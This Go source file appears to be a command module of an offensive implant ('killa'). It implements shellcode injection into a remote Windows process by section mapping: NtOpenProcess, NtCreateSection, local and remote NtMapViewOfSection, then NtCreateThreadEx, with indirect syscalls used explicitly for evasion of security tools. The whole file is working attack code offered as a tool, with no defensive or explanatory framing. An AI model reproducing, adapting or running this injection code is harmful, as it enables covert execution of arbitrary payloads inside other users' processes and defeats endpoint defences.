//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"killa/pkg/structs"
)

const (
	SECTION_ALL_ACCESS = 0x0F0000 | 0x001F // STANDARD_RIGHTS_REQUIRED | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE ...
	SEC_COMMIT         = 0x08000000
	ViewUnmap          = 0x2
)

// SectionInjectionCommand implements the section-injection command
type SectionInjectionCommand struct{}

func (c *SectionInjectionCommand) Name() string {
	return "section-injection"
}

func (c *SectionInjectionCommand) Description() string {
	return "Inject shellcode into a remote process using memory section mapping (NtCreateSection/NtMapViewOfSection)"
}

type sectionInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
}

func (c *SectionInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	if !IndirectSyscallsAvailable() {
		return errorResult("Error: This command requires indirect syscalls to be available")
	}

	var params sectionInjectionParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil || len(shellcode) == 0 {
		return errorResult("Error: invalid or empty shellcode data")
	}

	if params.PID <= 0 {
		return errorResult("Error: invalid PID specified")
	}

	var sb strings.Builder
	sb.WriteString("[*] Section Mapping Injection\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", params.PID))
	sb.WriteString("[*] Using indirect syscalls for evasion\n")

	// Step 1: Open Target Process Handle
	var hProcess uintptr
	desiredAccess := uint32(0x0002 | 0x0400 | 0x0008 | 0x0020 | 0x0010) // PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(params.PID))
	if status != 0 {
		return errorResult(fmt.Sprintf("%s[!] NtOpenProcess failed: NTSTATUS 0x%X\n", sb.String(), status))
	}
	defer IndirectNtClose(hProcess)
	sb.WriteString("[+] Opened target process handle\n")

	// Step 2: Create Section
	var hSection uintptr
	maxSize := int64(len(shellcode))
	status = IndirectNtCreateSection(&hSection, SECTION_ALL_ACCESS, &maxSize, 0x40, SEC_COMMIT, 0) // PAGE_EXECUTE_READWRITE = 0x40
	if status != 0 {
		return errorResult(fmt.Sprintf("%s[!] NtCreateSection failed: NTSTATUS 0x%X\n", sb.String(), status))
	}
	defer IndirectNtClose(hSection)
	sb.WriteString(fmt.Sprintf("[+] Created memory section (handle: 0x%X, size: %d bytes)\n", hSection, maxSize))

	// Step 3: Map Section to Local Process (RW)
	var localBaseAddress uintptr
	var localViewSize uintptr = 0
	hCurrentProcess := ^uintptr(0) // Pseudo-handle for current process
	status = IndirectNtMapViewOfSection(hSection, hCurrentProcess, &localBaseAddress, 0, nil, &localViewSize, ViewUnmap, 0, 0x04) // PAGE_READWRITE = 0x04
	if status != 0 {
		return errorResult(fmt.Sprintf("%s[!] NtMapViewOfSection (local) failed: NTSTATUS 0x%X\n", sb.String(), status))
	}
	defer IndirectNtUnmapViewOfSection(hCurrentProcess, localBaseAddress)
	sb.WriteString(fmt.Sprintf("[+] Mapped section to local process at 0x%X (RW)\n", localBaseAddress))

	// Step 4: Write Shellcode to Local Map
	destBytes := unsafe.Slice((*byte)(unsafe.Pointer(localBaseAddress)), len(shellcode))
	copy(destBytes, shellcode)
	sb.WriteString("[+] Copied shellcode into local section view\n")

	// Step 5: Map Section to Remote Process (RX)
	var remoteBaseAddress uintptr
	var remoteViewSize uintptr = 0
	status = IndirectNtMapViewOfSection(hSection, hProcess, &remoteBaseAddress, 0, nil, &remoteViewSize, ViewUnmap, 0, 0x20) // PAGE_EXECUTE_READ = 0x20
	if status != 0 {
		return errorResult(fmt.Sprintf("%s[!] NtMapViewOfSection (remote) failed: NTSTATUS 0x%X\n", sb.String(), status))
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped section to remote process at 0x%X (RX)\n", remoteBaseAddress))

	// Step 6: Create Remote Thread to Execute Shellcode
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, remoteBaseAddress)
	if status != 0 {
		return errorResult(fmt.Sprintf("%s[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", sb.String(), status))
	}
	defer IndirectNtClose(hThread)
	sb.WriteString(fmt.Sprintf("[+] Created remote thread (handle: 0x%X)\n", hThread))
	sb.WriteString("[+] Section Mapping injection completed successfully\n")

	return successResult(sb.String())
}
